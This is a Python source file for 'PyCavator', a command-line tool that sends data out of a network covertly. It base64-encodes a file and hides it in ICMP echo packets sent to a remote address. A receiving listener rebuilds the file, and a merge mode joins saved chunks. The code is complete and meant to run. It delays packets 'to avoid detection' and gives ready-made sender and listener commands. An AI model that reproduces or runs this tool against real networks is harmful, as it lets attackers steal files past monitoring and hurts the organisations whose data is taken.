import os
import re
import sys
import struct
import socket
import argparse
import random
import base64
import time

banner = '''
###############################################################
#                                                             #
#              PyCavator - Data Exfiltration                  #
#                                                             #
#                 Created by: Kryptohaker                     #
#                                                             #
###############################################################
'''
print(banner)

# icmp_exfiltration
def checksum(data):
    """Calculate the Internet Checksum of the supplied data"""

    # Checksum is the 16-bit one's complement of the one's complement sum
    # of all 16-bit words in the data
    n = len(data)
    m = n % 2
    sum = 0
    for i in range(0, n - m, 2):
        sum += (data[i]) + ((data[i + 1]) << 8)
    if m:
        sum += (data[-1])
    while (sum >> 16):
        sum = (sum & 0xFFFF) + (sum >> 16)
    checksum = ~sum & 0xFFFF
    return checksum

def encode_data_icmp(data):
    """Encodes data as ICMP payload"""
    # Add padding to make data length divisible by 4
    padding = b'\x00' * (4 - (len(data) % 4))
    data += padding
    # Pack data as bytes
    payload = struct.pack(f'>{len(data)}s', data)
    return payload

def send_icmp_packet(dst_addr, payload):
    """Sends an ICMP packet with the given payload to the specified destination address"""
    # Create raw socket
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    # Set TTL to 1 to avoid routing
    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, struct.pack('B', 1))
    # Generate random identifier and sequence number
    id = random.randint(0, 0xFFFF)
    seq = random.randint(0, 0xFFFF)
    # ICMP header
    icmp_type = 8
    icmp_code = 0
    icmp_checksum = 0
    icmp_identifier = id
    icmp_seqnum = seq
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_identifier, icmp_seqnum)
    # Calculate checksum over the entire ICMP packet (header + payload)
    icmp_checksum = checksum(icmp_header + payload)
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_identifier, icmp_seqnum)
    # Send ICMP packet
    s.sendto(icmp_header + payload, (dst_addr, 0))
    print(f"Sent data of size {len(payload)} bytes")

def send_data_icmp(args):
    # Read data from input file
    with open(args.input_file, 'rb') as f:
        data = f.read()
 
    # Detect file extension
    _, file_extension = os.path.splitext(args.input_file)
    file_extension = file_extension[1:]  # Remove the leading dot

    # Encode file extension and send it as the first packet
    send_icmp_packet(args.dst_addr, encode_data_icmp(file_extension.encode()))
 
    # Encode data as base64
    data = base64.b64encode(data)

    # Split data into multiple packets
    packet_size = 65000 # Maximum packet size for ICMP is 65535 bytes
    packets = [data[i:i+packet_size] for i in range(0, len(data), packet_size)]
    
    # Destination address
    dst_addr = args.dst_addr
    print(f"Exfiltrating data to {dst_addr}!")
    # Encode data as ICMP payload and send packets
    for payload in packets:
        send_icmp_packet(dst_addr, encode_data_icmp(payload))
        time.sleep(0.1) # Add delay between packets to avoid detection

# icmp_listener
def decode_data_icmp(payload):
    """Decodes data from ICMP payload"""
    # Calculate payload size
    payload_size = len(payload)
    num_ints = payload_size // 4
    num_bytes = num_ints * 4
    fmt = f">{num_bytes}s"
    # Unpack bytes from payload
    data = struct.unpack(fmt, payload[:num_bytes])
    # Remove padding
    data = bytes([b for b in data[0] if b != 0])
    return data

def clean_data(data):
    # Decode data from base64
    data = b''.join(data)
    decoded_data = base64.b64decode(data)
    return decoded_data

def receive_icmp_packets(src_addr, write, output_folder):
    # Default settings
    default_extension = 'bin'
    file_extension = None
    """Receives and decodes ICMP packets"""
    # Create raw socket
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    # Bind socket to all interfaces and port 0
    s.bind(('0.0.0.0', 0))
    
    # Check if 'data' folder exists, create it if it doesn't
    
    data_folder = 'data' if not output_folder else output_folder
    if not os.path.exists(data_folder):
        os.mkdir(data_folder)
        print(f"Created {data_folder} folder.")
        
    packet_num = 1
    data_chunks = []
    
    while True:
        # Receive ICMP packet
        packet, addr = s.recvfrom(65535)
        
        # Check if packet is from the specified source address
        if addr[0] == src_addr:
            # Extract ICMP payload
            payload = packet[28:]
            
            # Decode data from payload
            data = decode_data_icmp(payload)

            # If the file extension is not received yet, process the first packet as the file extension
            if not file_extension:
                file_extension = data.decode()
                print(f"File extension received: {file_extension}")
                continue   

            if write == 'c':
                # Save data to file with timestamp as filename
                filename = os.path.join(data_folder, f"output_{int(time.time())}_part{packet_num}.{file_extension}.{default_extension}")
                with open(filename, 'wb') as f:
                    f.write(data)
                print(f"Received data packet {packet_num} saved to {filename}")
            else:
                data_chunks.append(data)
                print(f"Received packet #{packet_num} from {addr[0]}")

            # Increment packet counter
            packet_num += 1

                
            if write != 'c':
                # Decode data
                decoded_data = clean_data(data_chunks)
                
                filename = os.path.join(data_folder, f"output.{file_extension}")
                with open(filename, 'wb') as f:
                    f.write(decoded_data)                 
                print(f"All data saved to {filename}")

            # Break the loop if there is no more data to receive
            if not data:
                break

def receive_data_icmp(args):
    # Start receiving ICMP packets
    print(f"Started to receive ICMP packets from {args.src_addr}")
    receive_icmp_packets(args.src_addr, args.write, args.output_folder)


def merge_output_files(prefix, start_suffix, end_suffix, extension, output_folder):
    """Merges output files with part numbers in the specified range"""
    # Get a list of all output files in the current directory
    default_extension = 'bin'
    files = os.listdir(output_folder)
    pattern = re.compile(fr"{prefix}_(\d+)_part(\d+)\.{extension}.{default_extension}$")
    output_files = [f for f in files if pattern.match(f)]
    # Filter files based on part number suffix
    suffix_nums = [int(pattern.match(f).group(2)) for f in output_files]
    filtered_files = [f for f, suffix_num in zip(output_files, suffix_nums) if start_suffix <= suffix_num <= end_suffix]
    # Sort filtered files based on part number suffix
    filtered_files.sort(key=lambda f: int(pattern.match(f).group(2)))
    # Merge files
    output_data = b''
    for f in filtered_files:
        f = os.path.join(output_folder, f)
        with open(f, 'rb') as f_in:
            output_data += base64.b64decode(f_in.read())
    # Write merged data to file
    merged_filename = f'merged_{prefix}_{start_suffix}-{end_suffix}.{extension}'
    merged_filename = os.path.join(output_folder, merged_filename)
    with open(merged_filename, 'wb') as f_out:
        f_out.write(output_data)
    print(f'Merged output written to {merged_filename}')

# Main function
def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description='Send and receive data using ICMP packets.',
        epilog='''Examples:
  # Sender mode: exfiltrate data from a file
  python pycavator-icmp.py -f input.txt -d 192.168.1.101
  
  # Listener mode: listen for incoming data and save in chunks
  python pycavator-icmp.py -l -s 192.168.1.100 -w c
  
  # Listener mode: listen for incoming data and save to a single file
  python pycavator-icmp.py -l -s 192.168.1.100 -w s -o output_folder
  
  # Merge mode: merge output files with part numbers in the specified range
  python pycavator-icmp.py --merge -x output -a 1 -b 10 -e txt -o output_folder
        ''',
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('-l', '--listen', action='store_true', help='listen for incoming data (default: send data)')
    parser.add_argument('-f', '--input_file', metavar='FILE', help='input file to exfiltrate (required in sender mode)')
    parser.add_argument('-d', '--dst_addr', metavar='ADDRESS', help='destination IP address (required in sender mode)')
    parser.add_argument('-s', '--src_addr', metavar='ADDRESS', help='source IP address to listen for (required in listener mode)')
    parser.add_argument('-w', '--write', metavar='WRITE', choices=['c','s'], help='choices to save data (c for chunk OR s to one single file, required in listener mode)')
    parser.add_argument('-o', '--output_folder', metavar='FOLDER', help='output folder for received data (optional in listener mode OR required in merge mode)')
    # Add merge mode arguments
    parser.add_argument('--merge', action='store_true', help='merge output files with part numbers in the specified range (default: False)')
    parser.add_argument('-x', '--prefix', metavar='PREFIX', help='prefix of the output file (required in merge mode)')
    parser.add_argument('-a', '--start_suffix', metavar='START_SUFFIX', type=int, help='start part number suffix (required in merge mode)')
    parser.add_argument('-b', '--end_suffix', metavar='END_SUFFIX', type=int, help='end part number suffix (required in merge mode)')
    parser.add_argument('-e', '--extension', metavar='EXTENSION', help='extension of the output file (required in merge mode for saving data to single file)')   
    args = parser.parse_args()

    # Check if no arguments were provided
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        exit(1)

    if args.merge:
        if not args.prefix or not args.start_suffix or not args.end_suffix or not args.extension or not args.output_folder:
            print("Missing required arguments for merge mode. Please provide prefix (-x), start_suffix (-a), end_suffix (-b), extension (-e), and output folder for received data (-o).")
            exit()
        merge_output_files(args.prefix, args.start_suffix, args.end_suffix, args.extension, args.output_folder)
    elif args.listen:
        if not args.src_addr or not args.write:
            print("Missing required arguments for listener mode. Please provide source address (-s), and choice to save data (-w).")
            exit()
        receive_data_icmp(args)
    else:
        if not args.input_file or not args.dst_addr:
            print("Missing required arguments for sender mode. Please provide input file (-f) and destination address (-d).")
            exit()
        send_data_icmp(args)

if __name__ == '__main__':
    main()
